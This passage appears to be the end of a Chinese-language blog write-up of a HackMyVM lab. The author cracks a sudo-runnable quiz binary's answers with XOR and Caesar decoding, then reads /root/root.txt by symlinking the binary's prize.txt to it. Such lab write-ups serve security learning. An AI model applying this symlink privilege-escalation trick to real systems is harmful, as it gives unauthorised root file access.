+<span class="pl-s">             "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you "</span>
+<span class="pl-s">             "don't, you win trash");</span>
+<span class="pl-s">  v<span class="pl-c1">3</span> = (__int<span class="pl-c1">64</span>)v<span class="pl-c1">5</span>;</span>
+<span class="pl-s">  writeResults(v<span class="pl-c1">5</span>, v<span class="pl-c1">5</span>[<span class="pl-c1">3</span>]);</span>
+<span class="pl-s">  if ( v<span class="pl-c1">5</span>[<span class="pl-c1">3</span>] == <span class="pl-c1">3</span> )</span>
+<span class="pl-s">  {</span>
+<span class="pl-s">    v<span class="pl-c1">3</span> = <span class="pl-c1">3</span>LL;</span>
+<span class="pl-s">    print_prize(<span class="pl-c1">3</span>LL);</span>
+<span class="pl-s">  }</span>
+<span class="pl-s">  if ( foo == <span class="pl-c1">85</span> )</span>
+<span class="pl-s">    wait_what(v<span class="pl-c1">3</span>);</span>
+<span class="pl-s">  return <span class="pl-c1">0</span>;</span>
+<span class="pl-s">}</span></pre></div>
+<p>主要是实现了，让你回答3个问题，如果回答正确了，可以获得一个泰迪熊。我们尝试获取一下问题的答案</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103"><img src="https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103" alt="image" style="max-width: 100%;"></a></p>
+<p>question_1的答案是<code class="notranslate">linux</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867"><img src="https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867" alt="image" style="max-width: 100%;"></a></p>
+<p>question_2的答案是<code class="notranslate">gfhts ufshfpjx</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35"><img src="https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35" alt="image" style="max-width: 100%;"></a></p>
+<p>question_3的答案是<code class="notranslate">hpok&amp;qorn&amp;vjsaohu</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4"><img src="https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4" alt="image" style="max-width: 100%;"></a></p>
+<p>第2和第3个是错的，可能是通过了加密，但是我没有系统的学过加密算法和逆向，所以只可以慢慢试了</p>
+<p>先有收获的是第3个，是使用了<strong>XOR</strong>，我通过<a href="https://cyberchef.org/" rel="nofollow">cyberchef</a>暴力破解获得了几个像密码的字符串</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b"><img src="https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b" alt="image" style="max-width: 100%;"></a></p>
+<p>我通过提权获得的字典表</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/tmp$ awk -F <span class="pl-s"><span class="pl-pds">"</span>: <span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span> tmp2 
+iqnj<span class="pl-s"><span class="pl-pds">'</span>pnso<span class="pl-pds">'</span></span>wkr<span class="pl-s"><span class="pl-pds">`</span>nit</span>
+<span class="pl-s">jrmi<span class="pl-smi">$smpl$thqcmjw</span></span>
+<span class="pl-s">kslh%rlqm%uipblkv</span>
+<span class="pl-s">ltko<span class="pl-s"><span class="pl-pds">"</span>ukvj<span class="pl-pds">"</span></span>rnweklq</span>
+<span class="pl-s">mujn#tjwk#sovdjmp</span>
+<span class="pl-s">nvim with plugins</span>
+<span class="pl-s">owhl<span class="pl-k">!</span>vhui<span class="pl-k">!</span>qmtfhor</span>
+<span class="pl-s"><span class="pl-pds">`</span></span>xgc.ygzf.~b{ig<span class="pl-s"><span class="pl-pds">`</span>}</span>
+<span class="pl-s">ayfb/xf{g/czhfa<span class="pl-k">|</span></span>
+<span class="pl-s">bzea,{exd,<span class="pl-k">|</span><span class="pl-pds">`</span></span>ykeb
+c{d<span class="pl-s"><span class="pl-pds">`</span>-zdye-}axjdc~</span>
+<span class="pl-s">d<span class="pl-k">|</span>cg<span class="pl-k">*</span>}c~b<span class="pl-k">*</span>zfmcdy</span>
+<span class="pl-s">e}bf+<span class="pl-k">|</span>bc+{g~lbex</span>
+<span class="pl-s">f~ae(a<span class="pl-k">|</span><span class="pl-s"><span class="pl-pds">`</span>(xd}oaf{</span></span>
+<span class="pl-s"><span class="pl-s">g<span class="pl-s"><span class="pl-pds">`</span>d)~<span class="pl-pds">`</span></span>}a)ye<span class="pl-k">|</span>n<span class="pl-pds">`</span></span>gz</span>
+<span class="pl-s">x<span class="pl-s"><span class="pl-pds">`</span>{6ab~6fzcqxe</span></span>
+<span class="pl-s"><span class="pl-s">ya~z7<span class="pl-pds">`</span></span>~c7g{bp~yd</span>
+<span class="pl-s">zb}y4c}<span class="pl-s"><span class="pl-pds">`</span><span class="pl-k">|</span>4dxas}zg</span></span>
+<span class="pl-s"><span class="pl-s">{c<span class="pl-k">|</span>x5b<span class="pl-k">|</span>a}5ey<span class="pl-pds">`</span></span>r<span class="pl-k">|</span>{f</span>
+<span class="pl-s"><span class="pl-k">|</span>d{2e{fz2b~gu{<span class="pl-k">|</span>a</span>
+<span class="pl-s">}ez~3dzg{3cftz}<span class="pl-s"><span class="pl-pds">`</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-k">~</span>fy}0gydx0<span class="pl-pds">`</span></span><span class="pl-k">|</span>ewy~c</span>
+<span class="pl-s">gx<span class="pl-k">|</span>1fxey1a}dvxb</span>
+<span class="pl-s">phws<span class="pl-k">&gt;</span>iwjv<span class="pl-k">&gt;</span>nrkywpm</span>
+<span class="pl-s">qivr<span class="pl-k">?</span>hvkw<span class="pl-k">?</span>osjxvql</span>
+<span class="pl-s">rjuq<span class="pl-k">&lt;</span>kuht<span class="pl-k">&lt;</span>lpi{uro</span>
+<span class="pl-s">sktp=jtiu=mqhztsn</span>
+<span class="pl-s">tlsw:msnr:jvo}sti</span>
+<span class="pl-s">umrv<span class="pl-k">;</span>lros<span class="pl-k">;</span>kwn<span class="pl-k">|</span>ruh</span>
+<span class="pl-s">vnqu8oqlp8htmqvk</span>
+<span class="pl-s">wopt9npmq9iul~pwj</span></pre></div>
+<p>写了个小脚本跑一下（AI辅助）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+password_file=<span class="pl-s"><span class="pl-pds">"</span>/tmp/tmp2<span class="pl-pds">"</span></span>
+
+<span class="pl-k">while</span> IFS= <span class="pl-c1">read</span> -r password<span class="pl-k">;</span> <span class="pl-k">do</span>
+  <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Trying password: <span class="pl-smi">$password</span><span class="pl-pds">"</span></span>
+  
+  <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password</span>\n<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo /opt/quiz/shop <span class="pl-k">&gt;</span> /tmp/output.txt
+  
+  <span class="pl-k">if</span> grep -q <span class="pl-s"><span class="pl-pds">"</span>Correct!!<span class="pl-pds">"</span></span> /tmp/output.txt<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Password found: <span class="pl-smi">$password</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">break</span>
+  <span class="pl-k">fi</span>
+<span class="pl-k">done</span> <span class="pl-k">&lt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span></pre></div>
+<p>执行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/tmp$ bash b.sh 
+Trying password: iqnj<span class="pl-s"><span class="pl-pds">'</span>pnso<span class="pl-pds">'</span></span>wkr<span class="pl-s"><span class="pl-pds">`</span>nit</span>
+<span class="pl-s">Trying password: jrmi<span class="pl-smi">$smpl$thqcmjw</span></span>
+<span class="pl-s">Trying password: kslh%rlqm%uipblkv</span>
+<span class="pl-s">Trying password: ltko<span class="pl-s"><span class="pl-pds">"</span>ukvj<span class="pl-pds">"</span></span>rnweklq</span>
+<span class="pl-s">Trying password: mujn#tjwk#sovdjmp</span>
+<span class="pl-s">Trying password: nvim with plugins</span>
+<span class="pl-s">Password found: nvim with plugins</span>
+<span class="pl-s"></span></pre></div>
+<p>第三个答案是：<code class="notranslate">nvim with plugins</code></p>
+<p>第二个的答案，细细品了一下，发现了一个"秘密"(第三个也可以通过这种方式获得加密的方法)<br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356"><img src="https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356" alt="image" style="max-width: 100%;"></a></p>
+<p>凯撒！！！</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d"><img src="https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d" alt="image" style="max-width: 100%;"></a></p>
+<p>所以第二题的答案是：<code class="notranslate">bacon pancakes</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/opt/quiz$ sudo /opt/quiz/shop
+Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator <span class="pl-k">for</span> 2 years.
+If you get all the questions right, you win a teddy bear and <span class="pl-k">if</span> you don<span class="pl-s"><span class="pl-pds">'</span>t, you win a teddy bear and if you don<span class="pl-pds">'</span></span>t, you win trash
+What is my favorite OS<span class="pl-k">?</span>
+linux
+Correct<span class="pl-k">!!</span>
+What is my favorite food<span class="pl-k">?</span>
+bacon pancakes
+Correct<span class="pl-k">!!</span>
+What is my favorite text editor<span class="pl-k">?</span>
+nvim with plugins
+Correct<span class="pl-k">!!</span>
+User name: 
+Saving results <span class="pl-c1">.</span>
+HURRAY YOU HAVE FOUND ME
+ _________________________________________________________
+<span class="pl-k">|</span><span class="pl-cce">\=</span>========================================================\
+<span class="pl-k">||</span>                                                         <span class="pl-k">|</span>
+<span class="pl-k">||</span>        _        __        ___        __        _        <span class="pl-k">|</span>
+<span class="pl-k">||</span>       <span class="pl-k">;</span> <span class="pl-s"><span class="pl-pds">`</span>-.__.-<span class="pl-s"><span class="pl-pds">'</span>. `-.__.-<span class="pl-pds">'</span></span>. .<span class="pl-pds">`</span></span>-.__.-<span class="pl-s"><span class="pl-pds">'</span> .`-.__.-<span class="pl-pds">'</span></span> <span class="pl-c1">:</span>       <span class="pl-k">|</span>
+<span class="pl-k">||</span>     _.<span class="pl-s"><span class="pl-pds">'</span>. . . . . . . . .,,,,,,,. . . . . . . . .`._     |</span>
+<span class="pl-s">||   .<span class="pl-pds">'</span></span>. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> ,a@@@@@@@@@@@a, <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> .<span class="pl-s"><span class="pl-pds">`</span>.   <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>   <span class="pl-pds">`</span></span>. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> ,<span class="pl-s"><span class="pl-pds">'</span>   |</span>
+<span class="pl-s">||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |</span>
+<span class="pl-s">||   ,<span class="pl-pds">'</span></span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">`</span>.   <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>   <span class="pl-pds">`</span></span>.. <span class="pl-c1">.</span> <span class="pl-c1">.</span> @@@%%a@@@@@@<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>@@@@@@@<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>@@@@@@a%%@@@ <span class="pl-c1">.</span> <span class="pl-c1">.</span> .,<span class="pl-s"><span class="pl-pds">'</span>   |</span>
+<span class="pl-s">||     ). . . "@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@" . . .(     |</span>
+<span class="pl-s">||   ,<span class="pl-pds">'</span></span>. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">`</span>@@@@@@@@SSS, ,SSS@@@@@@@@<span class="pl-s"><span class="pl-pds">'</span> . . . . .`.   |</span></span>
+<span class="pl-s"><span class="pl-s">||   `. . . . . . `@@@@@@@`SSS:SSS<span class="pl-pds">'</span></span>@@@@@@@<span class="pl-s"><span class="pl-pds">'</span> . . . . . ,<span class="pl-pds">'</span></span>   <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>     ) <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-pds">`</span></span>@@@@@@@sssssss@@@@@@@<span class="pl-s"><span class="pl-pds">'</span> . . . . . (     |</span>
+<span class="pl-s">||   ,<span class="pl-pds">'</span></span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> ,a@@a@@@@@@@@@@@@@@@a@@a, <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">`</span>.   <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>   <span class="pl-pds">`</span></span>.. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> .,<span class="pl-s"><span class="pl-pds">'</span>   |</span>
+<span class="pl-s">||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |</span>
+<span class="pl-s">||   ,<span class="pl-pds">'</span></span>. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> @@@@@@a@@@@<span class="pl-s"><span class="pl-pds">'</span>   "   `@@@@a@@@@@@ . . . .`.   |</span>
+<span class="pl-s">||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,<span class="pl-pds">'</span></span>   <span class="pl-k">|</span>
+<span class="pl-k">||</span>     ) <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">`</span>@@@@@@@@@@@@a, ,a@@@@@@@@@@@@<span class="pl-s"><span class="pl-pds">'</span> . . . (     |</span></span>
+<span class="pl-s"><span class="pl-s">||   ,<span class="pl-pds">'</span></span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> .<span class="pl-pds">`</span></span>@@@@@@@@@@a@a@a@@@@@@@@@@<span class="pl-s"><span class="pl-pds">'</span>. . . . . `.   |</span>
+<span class="pl-s">||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;<span class="pl-pds">'</span></span>   <span class="pl-k">|</span>
+<span class="pl-k">||</span>     )<span class="pl-k">;;;;;;;</span>,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,<span class="pl-k">;;;;;;;</span>(     <span class="pl-k">|</span>
+<span class="pl-k">||</span>   ,<span class="pl-k">;;;;;;;;</span>a@%<span class="pl-c"><span class="pl-c">#</span>%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |</span>
+<span class="pl-k">||</span>   <span class="pl-s"><span class="pl-pds">`</span><span class="pl-k">;;;;;;;;</span>@@%%%%%%%%%%M@@<span class="pl-s"><span class="pl-pds">"</span>;<span class="pl-pds">"</span></span>@@M%%%%%%%%%%@@<span class="pl-k">;;;;;;;;</span><span class="pl-s"><span class="pl-pds">'</span>   |</span></span>
+<span class="pl-s"><span class="pl-s">||     );;;;;;`@a%%%%%%%%mM";;;;;"Mm%%%%%%%%a@<span class="pl-pds">'</span></span><span class="pl-k">;;;;;;</span>(     <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>   ,<span class="pl-k">;;;;;;;;;;</span><span class="pl-s"><span class="pl-pds">"</span>@@@@@@@@<span class="pl-pds">"</span></span><span class="pl-k">;;;;;;;;;</span><span class="pl-s"><span class="pl-pds">"</span>@@@@@@@@<span class="pl-pds">"</span></span><span class="pl-k">;;;;;;;;;;</span>,   <span class="pl-k">|</span></span>
+<span class="pl-s"><span class="pl-k">||</span>   <span class="pl-s"><span class="pl-pds">`</span><span class="pl-k">;;;;;;;;;;;;</span><span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span></span><span class="pl-k">;;;;;;;;;;;;;</span><span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span></span><span class="pl-k">;;;;;;;;;;;;</span><span class="pl-s"><span class="pl-pds">'</span>   |</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s">||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s">||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:<span class="pl-pds">'</span></span>    <span class="pl-k">|</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-k">||</span>       <span class="pl-k">~</span>~~       <span class="pl-k">~</span>~        <span class="pl-k">~</span>~~        <span class="pl-k">~</span>~        <span class="pl-k">~</span>~~      <span class="pl-k">|</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-k">||</span>                     .=============.                     <span class="pl-k">|</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-k">||</span>                     <span class="pl-k">|</span>   Mr. Bear  <span class="pl-c1">:</span>                     <span class="pl-k">|</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-k">||</span>                     <span class="pl-pds">`</span></span>-------------<span class="pl-s"><span class="pl-pds">'</span>                     |</span></span>
+<span class="pl-s"><span class="pl-s">\|_________________________________________________________|</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">And now what??</span></span></pre></div>
+<p>来之不易的泰迪熊，然后再看下<strong>IDA</strong>这个泰迪熊怎么来的</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c"><img src="https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa"><img src="https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa" alt="image" style="max-width: 100%;"></a></p>
+<p>是查看了<code class="notranslate">prize.txt</code>文件，那就简单了，创建一个<strong>软链接</strong>就好了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/opt/quiz$ ln -s prize.txt /root/root.txt
+ln: failed to create symbolic link <span class="pl-s"><span class="pl-pds">'</span>/root/root.txt<span class="pl-pds">'</span></span>: Permission denied</pre></div>
+<p>蛙趣，没权限，等我回想了一下，好像要去家目录，之前看群主<code class="notranslate">ll04567</code>都可以实现，再试试</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/var/www/html$ ln -s /root/root.txt prize.txt 
+www-data@minimal:/var/www/html$ ls -al
+total 64
+drwxr-xr-x 4 www-data www-data 4096 Jan 14 08:56 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root     root     4096 Nov  1  2023 ..
+-rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php
+-rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php
+-rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php
+drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 imgs
+-rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php
+-rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php
+-rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php
+lrwxrwxrwx 1 www-data www-data   14 Jan 14 08:56 prize.txt -<span class="pl-k">&gt;</span> /root/root.txt
+-rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php
+-rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php
+-rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php
+-rw-r--r-- 1 root     root       18 Jan 14 07:58 results.txt
+-rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt
+-rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php
+drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles
+www-data@minimal:/var/www/html$ sudo /opt/quiz/shop
+Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator <span class="pl-k">for</span> 2 years.
+If you get all the questions right, you win a teddy bear and <span class="pl-k">if</span> you don<span class="pl-s"><span class="pl-pds">'</span>t, you win a teddy bear and if you don<span class="pl-pds">'</span></span>t, you win trash
+What is my favorite OS<span class="pl-k">?</span>
+linux
+Correct<span class="pl-k">!!</span>
+What is my favorite food<span class="pl-k">?</span>
+bacon pancakes
+Correct<span class="pl-k">!!</span>
+What is my favorite text editor<span class="pl-k">?</span>
+nvim with plugins
+Correct<span class="pl-k">!!</span>
+User name: 
+Saving results <span class="pl-c1">.</span>
+HMV{xxxxxxxxxxxxx} 
+</pre></div>
+<p>行了，下班</p>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif"><img src="assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif" alt="006mowZngy1gd6j0zxr0tg30as0bctww" style="max-width: 100%;"></a></p>
+<h1>5.后话</h1>
+<p>去看了其他大佬的<a href="http://162.14.82.114/index.php/574/04/16/2024/" rel="nofollow">wp</a>，发现还可以使用<strong>构造 ROP 链</strong>的方式提权，感兴趣的可以去看<code class="notranslate">HGBE</code>大佬的<a href="http://162.14.82.114/index.php/574/04/16/2024/" rel="nofollow">wp</a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
